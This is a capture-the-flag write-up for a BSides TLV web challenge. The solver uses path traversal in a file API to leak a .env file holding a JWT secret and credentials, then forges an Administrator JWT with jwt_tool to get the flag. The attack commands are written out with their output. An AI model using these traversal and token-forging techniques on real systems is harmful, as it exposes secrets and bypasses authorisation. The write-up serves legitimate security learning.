# S3cr3t Env1r0nm3nt R3cru1t

 * Category: Web
 * Solved by the JCTF Team

## Description

> Your mission, should you choose to accept it...
>
> Can you get invitation for the Justice League?

## Solution

We arrive to a very minimalistic website:

```html
<div class="card-header text-center">
    <h3>Welcome to the Justice League Realm</h3>
</div>
<div class="card-body text-center">
    <p>Ready to explore our comics?</p>
    <a href="/download-comics" class="btn btn-dark" style="font-weight:bold; color:#ffffff;">Start Here</a>
</div>
```

If we click the start button, a PDF is downloaded. In its `exif` metadata, we have a hint
towards our next step:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ exiftool Comics-1.pdf
ExifTool Version Number         : 13.25
File Name                       : Comics-1.pdf
Directory                       : .
File Size                       : 26 MB
File Modification Date/Time     : 2025:12:07 23:39:42+02:00
File Access Date/Time           : 2025:12:09 17:49:09+02:00
File Inode Change Date/Time     : 2025:12:07 23:39:42+02:00
File Permissions                : -rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.3
Linearized                      : No
Page Count                      : 1
Producer                        : PyPDF2
Path To Login                   : /login_to_justice
```

We visit `/login_to_justice` and get a login / registration form.  
We can register and get a token:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ curl 'https://bstlv25-justice-league-recruit.chals.io/api/v1/signup_to_justice' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-raw '{"username":"jctf2","password":"jctfjctfjctfjctf","password2":"jctfjctfjctfjctf"}'
{"status":"OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpjdGYyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUyOTU0OTksImV4cCI6MTc2NTM4MTg5OX0.kM35jgoTzdAm4j7mHWsnKdpFXW0MPkG9QCxx5AvqwWQ"}
```

After registration we get redirected to a webpage which does pretty much nothing. In the sources,
we see that some Javascript logic is included from `misc.js`.
It includes a lot of boilerplate code, but also the following three functions:

```javascript
$('#fetchState').click(
  function (e) {
    e.preventDefault();
    $.ajax({
      url: '/api/v4/file?fName=../../proc',
      method: 'POST',
      contentType: 'application/json',
      data: JSON.stringify({
        username,
        password
      }),
      success: function (r) {
        'OK' == r.status ||
        alert('error server')
      }
    })
  }
),
$('#btnSignup').click(
  function (e) {
    e.preventDefault();
    const u = $('#user').val(),
    p = $('#pwd').val(),
    p2 = $('#pwd2').val();
    $.ajax({
      url: '/api/v1/signup_to_justice',
      method: 'POST',
      contentType: 'application/json',
      data: JSON.stringify({
        username: u,
        password: p,
        password2: p2
      }),
      success: function (r) {
        'OK' == r.status ? window.location = './justice_on_hold?session=' + r.token : alert(r.msg)
      },
      error: function (r) {
        alert('Login failed: ' + r.responseJSON.error)
      }
    })
  }
),
$('#btnLogin').click(
  function (e) {
    e.preventDefault();
    const u = $('#user').val(),
    p = $('#pwd').val();
    $.ajax({
      url: '/api/v1/login_to_justice',
      method: 'POST',
      contentType: 'application/json',
      data: JSON.stringify({
        username: u,
        password: p
      }),
      success: function (r) {
        console.log('Login successful:', r),
        window.location = './justice_on_hold?session=' + r.token
      },
      error: function (r) {
        alert('Login failed: ' + r.responseJSON.error)
      }
    })
  }
);
```

The first one seems very interesting! We might be able to use it to leak files from the server!

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ curl -i -X POST 'https://bstlv25-justice-league-recruit.chals.io/api/v4/file?fName=../../proc' \
-H 'Content-Type: application/json' \
-d '{"username": "jctf2", "password": "jctfjctfjctfjctf"}'
HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 151
Date: Tue, 09 Dec 2025 16:04:35 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /api/v4/file</pre>
</body>
</html>
```

Ok, that's not working, it says we can't POST to this API. Let's try GET perhaps?

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ curl -i -X GET 'https://bstlv25-justice-league-recruit.chals.io/api/v4/file?fName=../../proc' \
-H 'Content-Type: application/json' \
-d '{"username": "jctf2", "password": "jctfjctfjctfjctf"}'
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 32
ETag: W/"20-rv1Ld0dT0taCkFeg9XILErK1UZA"
Date: Tue, 09 Dec 2025 16:06:40 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Access denied: No token provided
```

GET is actually working, even though the Javascript file said POST. It's also complaining about
a missing token, even though we gave it the username and password like the Javascript function
outlined. But, if it asks for a token, we'll give it a token - the token we got during registration.

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ curl 'https://bstlv25-justice-league-recruit.chals.io/api/v4/file?fName=../../proc' \                                                                                   -H 'Content-Type: application/json' \
-d '{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpjdGYyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUyOTU0OTksImV4cCI6MTc2NTM4MTg5OX0.kM35jgoTzdAm4j7mHWsnKdpFXW0MPkG9QCxx5AvqwWQ"}'
Access denied: No token provided                                                                                                                                                   
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ curl 'https://bstlv25-justice-league-recruit.chals.io/api/v4/file?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpjdGYyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUyOTU0OTksImV4cCI6MTc2NTM4MTg5OX0.kM35jgoTzdAm4j7mHWsnKdpFXW0MPkG9QCxx5AvqwWQ&fName=../../proc'
Access denied: No token provided 
```

Maybe we should call it `session` like the other APIs do?

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ curl -X GET 'https://bstlv25-justice-league-recruit.chals.io/api/v4/file?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpjdGYyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUyOTU0OTksImV4cCI6MTc2NTM4MTg5OX0.kM35jgoTzdAm4j7mHWsnKdpFXW0MPkG9QCxx5AvqwWQ&fName=../../proc'
Permission denied
```

This is progress, right? Is that "permission denied" due to the token or due to the file?

We try different paths and files, but keep getting "permission denied". However, the challenge
name is pointing us to the "environment". One safe bet would have been `/proc/self/environ`, but
that didn't work as well. What did work was `.env`:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ curl -X GET 'https://bstlv25-justice-league-recruit.chals.io/api/v4/file?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpjdGYyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUyOTU0OTksImV4cCI6MTc2NTM4MTg5OX0.kM35jgoTzdAm4j7mHWsnKdpFXW0MPkG9QCxx5AvqwWQ&fName=.env'

  # App Configuration
  APP_NAME=MyCoolApp
  NODE_ENV=development
  PORT=3000

  # Database Configuration
  DB_HOST=localhost
  DB_PORT=5432
  DB_USER=devuser
  DB_PASSWORD=S3curePass123!
  DB_NAME=myapp_dev

  # JWT Secrets
  JWT_SECRET=D0N87sT45ryusY09iProc3ss
  JWT_EXPIRY=1h

  # API Keys
  SENDGRID_API_KEY=SG.apikey.1234567890abcdef
  STRIPE_SECRET_KEY=sk_test_51FakeStripeKey
  GOOGLE_CLIENT_ID=google-client-id.apps.googleusercontent.com
  GOOGLE_CLIENT_SECRET=google-client-secret

  # Third Party URLs
  REDIS_URL=redis://localhost:6379
  MONGO_URI=mongodb://devuser:S3curePass123!@localhost:27017/myapp

  # Feature Toggles
  ENABLE_EMAIL_NOTIFICATIONS=true
  ENABLE_ANALYTICS=false
```

We have the JWT Secret! We can now sign JWT tokens ourselves!

Let's take a look at the JWT token we have:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpjdGYyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUyOTU0OTksImV4cCI6MTc2NTM4MTg5OX0.kM35jgoTzdAm4j7mHWsnKdpFXW0MPkG9QCxx5AvqwWQ                                                                                                                                             
        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] username = "jctf2"
[+] role = "user"
[+] iat = 1765295499    ==> TIMESTAMP = 2025-12-09 17:51:39 (UTC)
[+] exp = 1765381899    ==> TIMESTAMP = 2025-12-10 17:51:39 (UTC)

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 1 days, 0 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

So we want to change our role to be an administrator. It took a bit of back-and-forth, but
eventually the combination that worked is having both the username and the password as 
"Administrator".

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpjdGYyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUyOTU0OTksImV4cCI6MTc2NTM4MTg5OX0.kM35jgoTzdAm4j7mHWsnKdpFXW0MPkG9QCxx5AvqwWQ -X i -I -pc role -pv Administrator -pc username -pv Administrator -S hs256 -p D0N87sT45ryusY09iProc3ss

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

jwttool_b6097b322532d2faeef1e57af5419f3f - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFkbWluaXN0cmF0b3IiLCJyb2xlIjoiQWRtaW5pc3RyYXRvciIsImlhdCI6MTc2NTI5NTQ5OSwiZXhwIjoxNzY1MzgxODk5fQ.3C9TweOmPnfD8twpvffJzVLYtDCcyQIm8CcAIPAA8RI
```

We use this as the session ID to get the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/S3cr3t_Env1r0nm3nt_R3cru1t]
└─$ curl "https://bstlv25-justice-league-recruit.chals.io/justice_on_hold?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFkbWluaXN0cmF0b3IiLCJyb2xlIjoiQWRtaW5pc3RyYXRvciIsImlhdCI6MTc2NTI5NTQ5OSwiZXhwIjoxNzY1MzgxODk5fQ.3C9TweOmPnfD8twpvffJzVLYtDCcyQIm8CcAIPAA8RI" -s | grep -i flag
                                                🎉 FLAG: <span style="color: lime;">BSidesTLV2025{B4tm4n_St0l3_JWT!}</span>
```